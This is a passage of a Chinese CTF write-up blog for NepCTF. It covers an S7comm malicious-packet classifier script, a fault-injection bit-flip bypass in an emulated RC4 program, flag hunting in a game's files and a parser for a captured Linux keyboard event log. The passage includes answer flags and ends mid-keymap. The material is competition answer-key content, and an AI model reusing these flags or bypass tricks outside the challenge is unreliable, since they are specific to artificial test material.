range(len(pitems)):</span><br><span class="line">                if overflow == b&quot;\x01&quot;and pitems[x].address &gt;= 0x001f70and ditems[x].data == b&quot;\x01&quot;:</span><br><span class="line">                    evil = True</span><br><span class="line">                    break</span><br><span class="line">                if x != len(pitems) - 1and ditems.isLast == True:</span><br><span class="line">                    evil = True</span><br><span class="line">                    break</span><br><span class="line">    except:</span><br><span class="line">        returnTrue, packetTPKT, packetCOTP, packetS7comm</span><br><span class="line">    return evil, packetTPKT, packetCOTP, packetS7comm</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    p = remote(&#x27;nepctf31-n5p4-uo7p-ste2-vqvmbdffg228.nepctf.com&#x27;, 443, sni=True, typ=&quot;tcp&quot;, ssl=True)</span><br><span class="line">    p.recvuntil(b&quot;&gt; &quot;)</span><br><span class="line">    p.sendline(b&quot;1&quot;)</span><br><span class="line">    for x in range(100):</span><br><span class="line">        p.recvuntil(b&quot; /\n&quot;)</span><br><span class="line">        q = p.recvline().decode()</span><br><span class="line">        packet = ast.literal_eval(q)</span><br><span class="line">        is_evil, _, __, ___ = parse_check(packet, hasPrefix=True)</span><br><span class="line">        print(x, q, is_evil)</span><br><span class="line">        p.recvuntil(b&quot;&gt; &quot;)</span><br><span class="line">        p.sendline(b&quot;1&quot;if is_evil elseb&quot;0&quot;)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>*<em>ICS*</em>*<em>后日谈</em>*</p>
<p>首先给大家道个歉，这题的点位基本上是正常恶意对半开再随机的，但是没考虑到点位的难度不同，所以可能导致各位师傅拿到的难度不太一致，很多师傅可能只遇到了其中的3到5个简单点位，这点确实考虑不太周到。</p>
<p>其次，感谢各位师傅来做ICS方向的题，这个方向的题目可能出得不是很成熟，初衷是希望能帮助大家了解更多实在的工业控制过程以及这个过程中的多种威胁（比如越界的读写、非法上传、恶意干预），以及一些相关的防护措施（比如SIEM）。如果这些题目能激起师傅们的兴趣了解相关的一些内容，那就完成使命了。如果给大家带来不好的体验，薯饼给大家道歉。</p>
<p>这题还有另一个很Iron的模式，和ICS不太相关，没来得及处理完成，留待明年花再开（</p>
</blockquote>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h1><h2 id="easyshock"><a href="#easyshock" class="headerlink" title="easyshock"></a><strong>easyshock</strong></h2><p>给出的 prog 实际为 RC4 算法，并将解密后的字节放到 OutputBuffer中 ，遇到 00 停止</p>
<p>给出 text.txt 中恰好有一个 00 字节，截断后面的输出文字</p>
<p>hook_code 每次执行一条汇编指令时 +1 ，当 CODE_COUNT 为 输入的 Shocktime 是，会触发 shock，将当前指令涉及的寄存器翻转1个bit</p>
<p>可利用这个翻转bit，将cmp指令时与 0 比较 绕过</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seg000:000000000000028D                 cmp     eax, 0</span><br></pre></td></tr></table></figure></div>

<p>需要确定执行这条指令时 CODE_COUNT 的值</p>
<p>在 hook_code 中添加以下代码，得到执行这条汇编指令时的 CODE_COUNT</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(address == CODE_ADDRESS + 0x28D):</span><br><span class="line">    print(CODE_COUNT)</span><br></pre></td></tr></table></figure></div>

<p>输入最后一次 CODE_COUNT ，即可绕过，输出 FLAG</p>
<p>49239</p>
<p>FLAG模板 <code>NepCTF&#123;OhhHhhHhhhhH_I_get_Shooooooooooooocked_AAAAAAAAAAAAAH&#125;</code></p>
<p>PS. 输入 5410 大概有 1&#x2F;10000 概率能通过</p>
<h2 id="MoewBle喵泡"><a href="#MoewBle喵泡" class="headerlink" title="MoewBle喵泡"></a><strong>MoewBle喵泡</strong></h2><p>进入正式关卡后，左下角告示牌会提供 1&#x2F;9 的 flag，那么这时候可以考虑两种情况，一种是告示牌绑定在代码里面动态赋值，一种是直接写死在告示牌里面。然后这时候其实简单搜索一下就会发现了，我是直接明文塞在场景里面的。</p>
<p>找一下 level2 和 level3 这两个场景文件，就可以找到 8&#x2F;9 份的 flag，还少一个第七段。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgXu4LakX7EzSWzj4IltqPKvq0ohgsicXMGiaXeBw4eKNurPp4IDvGBt5w/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>本题没有要求要逆向，所以在一些告示牌是放了提示的</p>
<p>一个是在地图外面放了个算是小彩蛋的东西吧（这个 bug 不难发现，我估计大家应该都能到这个地方）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgLC8nJgffU6S1ibOVa99icBJLXac9Ij2ACEWzY6YukT4VQEEH5vqIicacg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>还有就是这里，位置卡的很严苛，很难过来（我还故意把触发提示框的碰撞体改的非常小，嘻嘻）</p>
<p>这里应该不难看出来是有类似 GM 的东西的，然后根据 “上上下下” 应该很容易想到那个经典的作弊码 “上上下下左右左右BA”（去网站搜索一下应该也很容易搜出来）</p>
<p>所以预期就是结合这两个提示，在每个页面都试一试作弊码，最后发现是在【设置】界面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgzEAx329OEFXlNjIH2EDqCibz82ibRuMdZMrs35pPUdxxCoCDHBLbUCeQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>打开gm界面之后按照提示获取 flag 就行了，执行  getflag 7 即可得到 flag 的最后一块拼图。</p>
<p>（不知道大家有没有体验一下其他的 gm 命名）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXg9SVhN5yRvHupuWt48OXE5vj4HxjkedEwOUl7v2ALOlhRgiaHDxZicw4A/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>把所有片段拼起来，包上 NepCTF{} 就是最终 flag 了</p>
<p>NepCTF{94721248-773d-0b25-0e2d-db9cac299389}</p>
<blockquote>
<p>看到最后问卷的结果里面本题的【希望暴打出题人】指数高居榜首，有些受宠若惊，我会好好吸取大家意见，制作更多有趣（wa ken）的小游戏题</p>
</blockquote>
<h2 id="NAS狗都不玩"><a href="#NAS狗都不玩" class="headerlink" title="NAS狗都不玩"></a><strong>NAS狗都不玩</strong></h2><p>See u next time<em>^_^</em></p>
<h2 id="NepBotEvent"><a href="#NepBotEvent" class="headerlink" title="NepBotEvent"></a><strong>NepBotEvent</strong></h2><p>文件给出的是Linux Dev Input Event的记录数据，所以关键是找到文件的结构。</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://stackoverflow.com/a/16682549" >https://stackoverflow.com/a/16682549 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct input_event &#123;</span><br><span class="line">    struct timeval time;</span><br><span class="line">    unsigned short type;</span><br><span class="line">    unsigned short code;</span><br><span class="line">    unsigned int value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>根据文件的结构写出对应的解析脚本</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line"># script built on https://stackoverflow.com/a/16682549</span><br><span class="line">import struct</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">infile_path = &quot;NepBot_keylogger&quot;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">FORMAT represents the format used by linux kernel input event struct</span><br><span class="line">See https://github.com/torvalds/linux/blob/v5.5-rc5/include/uapi/linux/input.h#L28</span><br><span class="line">Stands for: long int, long int, unsigned short, unsigned short, unsigned int</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">FORMAT = &#x27;llHHI&#x27;</span><br><span class="line">EVENT_SIZE = struct.calcsize(FORMAT)</span><br><span class="line"></span><br><span class="line">#open file in binary mode</span><br><span class="line">in_file = open(infile_path, &quot;rb&quot;)</span><br><span class="line"></span><br><span class="line">event = in_file.read(EVENT_SIZE)</span><br><span class="line"></span><br><span class="line">keymap = &#123;</span><br><span class="line">        0: &quot;KEY_RESERVED&quot;,</span><br><span class="line">        1: &quot;KEY_ESC&quot;,</span><br><span class="line">        2: &quot;KEY_1&quot;,</span><br><span class="line">        3: &quot;KEY_2&quot;,</span><br><span class="line">        4: &quot;KEY_3&quot;,</span><br><span class="line">        5: &quot;KEY_4&quot;,</span><br><span class="line">        6: &quot;KEY_5&quot;,</span><br><span class="line">        7: &quot;KEY_6&quot;,</span><br><span class="line">        8: &quot;KEY_7&quot;,</span><br><span class="line">        9: &quot;KEY_8&quot;,</span><br><span class="line">        10: &quot;KEY_9&quot;,</span><br><span class="line">        11: &quot;KEY_0&quot;,</span><br><span class="line">        12: &quot;KEY_MINUS&quot;,</span><br><span class="line">        13: &quot;KEY_EQUAL&quot;,</span><br><span class="line">        14: &quot;KEY_BACKSPACE&quot;,</span><br><span class="line">        15: &quot;KEY_TAB&quot;,</span><br><span class="line">        16: &quot;KEY_Q&quot;,</span><br><span class="line">        17: &quot;KEY_W&quot;,</span><br><span class="line">        18: &quot;KEY_E&quot;,</span><br><span class="line">        19: &quot;KEY_R&quot;,</span><br><span class="line">        20: &quot;KEY_T&quot;,</span><br><span class="line">        21: &quot;KEY_Y&quot;,</span><br><span class="line">        22: &quot;KEY_U&quot;,</span><br><span class="line">        23: &quot;KEY_I&quot;,</span><br><span class="line">        24: &quot;KEY_O&quot;,</span><br><span class="line">        25: &quot;KEY_P&quot;,</span><br><span class="line">        26: &quot;KEY_LEFTBRACE&quot;,</span><br><span class="line">        27: &quot;KEY_RIGHTBRACE&quot;,</span><br><span class="line">        28: &quot;KEY_ENTER&quot;,</span><br><span class="line">        29: &quot;KEY_LEFTCTRL&quot;,</span><br><span class="line">        30: &quot;KEY_A&quot;,</span><br><span class="line">        31: &quot;KEY_S&quot;,</span><br><span class="line">        32: &quot;KEY_D&quot;,</span><br><span class="line">        33: &quot;KEY_F&quot;,</span><br><span class="line">        34: &quot;KEY_G&quot;,</span><br><span class="line">        35: &quot;KEY_H&quot;,</span><br><span class="line">        36: &quot;KEY_J&quot;,</span><br><span class="line">        37: &quot;KEY_K&quot;,</span><br><span class="line">        38: &quot;KEY_L&quot;,</span><br><span class="line">        39: &quot;KEY_SEMICOLON&quot;,</span><br><span class="line">        40: &quot;KEY_APOSTROPHE&quot;,</span><br><span class="line">        41: &quot;KEY_GRAVE&quot;,</span><br><span class="line">        42: &quot;KEY_LEFTSHIFT&quot;,</span><br><span class="line">        43: &quot;KEY_BACKSLASH&quot;,</span><br><span class="line">        44: &quot;KEY_Z&quot;,</span><br><span class="line">        45: &quot;KEY_X&quot;,</span><br><span class="line">        46: &quot;KEY_C&quot;,</span><br><span class="line">        47: &quot;KEY_V&quot;,</span><br><span class="line">        48: &quot;KEY_B&quot;,</span><br><span class="line">        49: &quot;KEY_N&quot;,</span><br><span class="line">        50: &quot;KEY_M&quot;,</span><br><span class="line">        51: &quot;KEY_COMMA&quot;,</span><br><span class="line">        52: &quot;KEY_DOT&quot;,</span><br><span class="line">        53: &quot;KEY_SLASH&quot;,</span><br><span class="line">        54: &quot;KEY_RIGHTSHIFT&quot;,</span><br><span class="line">        55: &quot;KEY_KPASTERISK&quot;,</span><br><span class="line">        56: &quot;KEY_LEFTALT&quot;,</span><br><span class="line">        57: &quot;KEY_SPACE&quot;,</span><br><span class="line">        58: &quot;KEY_CAPSLOCK&quot;,</span><br><span class="line">        59: &quot;KEY_F1&quot;,</span><br><span class="line">        60: &quot;KEY_F2&quot;,</span><br><span class="line">        61: &quot;KEY_F3&quot;,</span><br><span class="line">        62: &quot;KEY_F4&quot;,</span><br><span class="line">        63: &quot;KEY_F5&quot;,</span><br><span class="line">        64: &quot;KEY_F6&quot;,</span><br><span class="line">        65: &quot;KEY_F7&quot;,</span><br><span class="line">        66: &quot;KEY_F8&quot;,</span><br><span class="line">        67: &quot;KEY_F9&quot;,</span><br><span class="line">        68: &quot;KEY_F10&quot;,</span><br><span class="line">        69: &quot;KEY_NUMLOCK&quot;,</span><br><span class="line">        70: &quot;KEY_SCROLLLOCK&quot;,</span><br><span class="line">        71: &quot;KEY_KP7&quot;,</span><br><span class="line">        72: &quot;KEY_KP8&quot;,</span><br><span class="line">        73: &quot;KEY_KP9&quot;,</span><br><span class="line">        74: &quot;KEY_KPMINUS&quot;,</span><br><span class="line">        75: &quot;KEY_KP4&quot;,</span><br><span class="line">        76: &quot;KEY_KP5&quot;,</span><br><span class="line">        77: &quot;KEY_KP6&quot;,</span><br><span class="line">        78: &quot;KEY_KPPLUS&quot;,</span><br><span class="line">        79: &quot;KEY_KP1&quot;,</span><br><span class="line">        80: &quot;KEY_KP2&quot;,</span><br><span class="line">        81: &quot;KEY_KP3&quot;,</span><br><span class="line">        82: &quot;KEY_KP0&quot;,</span><br><span class="line">        83: &quot;KEY_KPDOT&quot;,</span><br><span class="line"></span><br><span class="line">        85: &quot;KEY_ZENKAKUHANKAKU&quot;,</span><br><span class="line">        86: &quot;KEY_102ND&quot;,</span><br><span class="line">        87: &quot;KEY_F11&quot;,</span><br><span class="line">        88: &quot;KEY_F12&quot;,</span><br><span class="line">        89: &quot;KEY_RO&quot;,</span><br><span class="line">        90: &quot;KEY_KATAKANA&quot;,</span><br><span class="line">        91: &quot;KEY_HIRAGANA&quot;,</span><br><span class="line">        92: &quot;KEY_HENKAN&quot;,</span><br><span class="line">        93: &quot;KEY_KATAKANAHIRAGANA&quot;,</span><br><span class="line">        94: &quot;KEY_MUHENKAN&quot;,</span><br><span class="line">        95: &quot;KEY_KPJPCOMMA&quot;,</span><br><span class="line">        96: &quot;KEY_KPENTER&quot;,</span><br><span class="line">        97: &quot;KEY_RIGHTCTRL&quot;,</span><br><span class="line">        98: &quot;KEY_KPSLASH&quot;,</span><br><span class="line">        99: &quot;KEY_SYSRQ&quot;,</span><br><span class="line">        100: &quot;KEY_RIGHTALT&quot;,</span><br><span class="line">        101: &quot;KEY_LINEFEED&quot;,</span><br><span class="line">        102: &quot;KEY_HOME&quot;,</span><br><span class="line">        103: &quot;KEY_UP&quot;,</span><br><span class="line">        104: &quot;KEY_PAGEUP&quot;,</span><br><span class="line">        105: &quot;KEY_LEFT&quot;,</span><br><span class="line">        106: &quot;KEY_RIGHT&quot;,</span><br><span class="line">        107: &quot;KEY_END&quot;,</span><br><span class="line">        108: &quot;KEY_DOWN&quot;,</span><br><span class="line">        109: &quot;KEY_PAGEDOWN&quot;,</span><br><span class="line">        110: &quot;KEY_INSERT&quot;,</span><br><span class="line">        111: &quot;KEY_DELETE&quot;,</span><br><span class="line">        112: &quot;KEY_MACRO&quot;,</span><br><span class="line">        113: &quot;KEY_MUTE&quot;,</span><br><span class="line">        114: &quot;KEY_VOLUMEDOWN&quot;,</span><br><span class="line">        115: &quot;KEY_VOLUMEUP&quot;,</span><br><span class="line">        116: &quot;KEY_POWER&quot;,</span><br><span class="line">        117: &quot;KEY_KPEQUAL&quot;,</span><br><span class="line">        118: &quot;KEY_KPPLUSMINUS&quot;,</span><br><span class="line">        119: &quot;KEY_PAUSE&quot;,</span><br><span class="line">        120: &quot;KEY_SCALE&quot;,</span><br><span class="line"></span><br><span class="line">        121: &quot;KEY_KPCOMMA&quot;,</span><br><span class="line">        122: &quot;KEY_HANGEUL&quot;,</span><br><span class="line">        122: &quot;KEY_HANGUEL&quot;,</span><br><span class="line">        123: &quot;KEY_HANJA&quot;,</span><br><span class="line">        124: &quot;KEY_YEN&quot;,</span><br><span class="line">        125: &quot;KEY_LEFTMETA&quot;,</span><br><span class="line">        126: &quot;KEY_RIGHTMETA&quot;,</span><br><span class="line">        127: &quot;KEY_COMPOSE&quot;,</span><br><span class="line"></span><br><span class="line">        128: &quot;KEY_STOP&quot;,</span><br><span class="line">        129: &quot;KEY_AGAIN&quot;,</span><br><span class="line">        130: &quot;KEY_PROPS&quot;,</span><br><span class="line">        131: &quot;KEY_UNDO&quot;,</span><br><span class="line">        132: &quot;KEY_FRONT&quot;,</span><br><span class="line">        133: &quot;KEY_COPY&quot;,</span><br><span class="line">        134: &quot;KEY_OPEN&quot;,</span><br><span class="line">        135: &quot;KEY_PASTE&quot;,</span><br><span class="line">        136: &quot;KEY_FIND&quot;,</span><br><span class="line">        137: &quot;KEY_CUT&quot;,</span><br><span class="line">        138: &quot;KEY_HELP&quot;,</span><br><span class="line">        139: &quot;KEY_MENU&quot;,</span><br><span class="line">        140: &quot;KEY_CALC&quot;,</span><br><span class="line">        141: &quot;KEY_SETUP&quot;,</span><br><span class="line">        142: &quot;KEY_SLEEP&quot;,</span><br><span class="line">        143: &quot;KEY_WAKEUP&quot;,</span><br><span class="line">        144: &quot;KEY_FILE&quot;,</span><br><span class="line">        145: &quot;KEY_SENDFILE&quot;,</span><br><span class="line">        146: &quot;KEY_DELETEFILE&quot;,</span><br><span class="line">        147: &quot;KEY_XFER&quot;,</span><br><span class="line">        148: &quot;KEY_PROG1&quot;,</span><br><span class="line">        149: &quot;KEY_PROG2&quot;,</span><br><span class="line">        150: &quot;KEY_WWW&quot;,</span><br><span class="line">        151: &quot;KEY_MSDOS&quot;,</span><br><span class="line">        152: &quot;KEY_COFFEE&quot;,</span><br><span class="line">        152: &quot;KEY_SCREENLOCK&quot;,</span><br><span class="line">        153: &quot;KEY_ROTATE_DISPLAY&quot;,</span><br><span class="line">        153: &quot;KEY_DIRECTION&quot;,</span><br><span class="line">        154: &quot;KEY_CYCLEWINDOWS&quot;,</span><br><span class="line">        155: &quot;KEY_MAIL&quot;,</span><br><span class="line">        156: &quot;KEY_BOOKMARKS&quot;,</span><br><span class="line">        157: &quot;KEY_COMPUTER&quot;,</span><br><span class="line">        158: &quot;KEY_BACK&quot;,</span><br><span class="line">        159: &quot;KEY_FORWARD&quot;,</span><br><span class="line">        160: &quot;KEY_CLOSECD&quot;,</span><br><span class="line">        161: &quot;KEY_EJECTCD&quot;,</span><br><span class="line">        162: &quot;KEY_EJECTCLOSECD&quot;,</span><br><span class="line">        163: &quot;KEY_NEXTSONG&quot;,</span><br><span class="line">        164: &quot;KEY_PLAYPAUSE&quot;,</span><br><span class="line">        165: &quot;KEY_PREVIOUSSONG&quot;,</span><br><span class="line">        166: &quot;KEY_STOPCD&quot;,</span><br><span class="line">        167: &quot;KEY_RECORD&quot;,</span><br><span class="line">        168: &quot;KEY_REWIND&quot;,</span><br><span class="line">        169: &quot;KEY_PHONE&quot;,</span><br><span class="line">        170: &quot;KEY_ISO&quot;,</span><br><span class="line">        171: &quot;KEY_CONFIG&quot;,</span><br><span class="line">        172: &quot;KEY_HOMEPAGE&quot;,</span><br><span class="line">        173: &quot;KEY_REFRESH&quot;,</span><br><span class="line">        174: &quot;KEY_EXIT&quot;,</span><br><span class="line">        175: &quot;KEY_MOVE&quot;,</span><br><span class="line">        176: &quot;KEY_EDIT&quot;,</span><br><span class="line">        177: &quot;KEY_SCROLLUP&quot;,</span><br><span class="line">        178: &quot;KEY_SCROLLDOWN&quot;,</span><br><span class="line">        179: &quot;KEY_KPLEFTPAREN&quot;,</span><br><span class="line">        180: &quot;KEY_KPRIGHTPAREN&quot;,</span><br><span class="line">        181: &quot;KEY_NEW&quot;,</span><br><span class="line">        182: &quot;KEY_REDO&quot;,</span><br><span class="line"></span><br><span class="line">        183: &quot;KEY_F13&quot;,</span><br><span class="line">        184: &quot;KEY_F14&quot;,</span><br><span class="line">        185: &quot;KEY_F15&quot;,</span><br><span class="line">        186: &quot;KEY_F16&quot;,</span><br><span class="line">        187: &quot;KEY_F17&quot;,</span><br><span class="line">        188: &quot;KEY_F18&quot;,</span><br><span class="line">        189: &quot;KEY_F19&quot;,</span><br><span class="line">        190: &quot;KEY_F20&quot;,</span><br><span class="line">        191: &quot;KEY_F21&quot;,</span><br><span class="line">        192: &quot;KEY_F22&quot;,</span><br><span class="line">        193: &quot;KEY_F23&quot;,</span><br><span class="line">        194: &quot;KEY_F24&quot;,</span><br><span class="line"></span><br><span class="line">        200: &quot;KEY_PLAYCD&quot;,</span><br><span class="line">        201: &quot;KEY_PAUSECD&quot;,</span><br><span class="line">        202: &quot;KEY_PROG3&quot;,</span><br><span class="line">        203: &quot;KEY_PROG4&quot;,</span><br><span class="line">        204: &quot;KEY_DASHBOARD&quot;,</span><br><span class="line">        205: &quot;KEY_SUSPEND&quot;,</span><br><span class="line">        206: &quot;KEY_CLOSE&quot;,</span><br><span class="line">        207: &quot;KEY_PLAY&quot;,</span><br><span class="line">        208: &quot;KEY_FASTFORWARD&quot;,</span><br><span class="line">        209: &quot;KEY_BASSBOOST&quot;,</span><br><span class="line">        210: &quot;KEY_PRINT&quot;,</span><br><span class="line">        211: &quot;KEY_HP&quot;,</span><br><span class="line">        212: &quot;KEY_CAMERA&quot;,</span><br><span class="line">        213: &quot;KEY_SOUND&quot;,</span><br><span class="line">        214: &quot;KEY_QUESTION&quot;,</span><br><span class="line">        215: &quot;KEY_EMAIL&quot;,</span><br><span class="line">        216: &quot;KEY_CHAT&quot;,</span><br><span class="line">        217: &quot;KEY_SEARCH&quot;,</span><br><span class="line">        218: &quot;KEY_CONNECT&quot;,</span><br><span class="line">        219: &quot;KEY_FINANCE&quot;,</span><br><span class="line">        220: &quot;KEY_SPORT&quot;,</span><br><span class="line">        221: &quot;KEY_SHOP&quot;,</span><br><span class="line">        222: &quot;KEY_ALTERASE&quot;,</span><br><span class="line">        223: &quot;KEY_CANCEL&quot;,</span><br><span class="line">        224: &quot;KEY_BRIGHTNESSDOWN&quot;,</span><br><span class="line">        225: 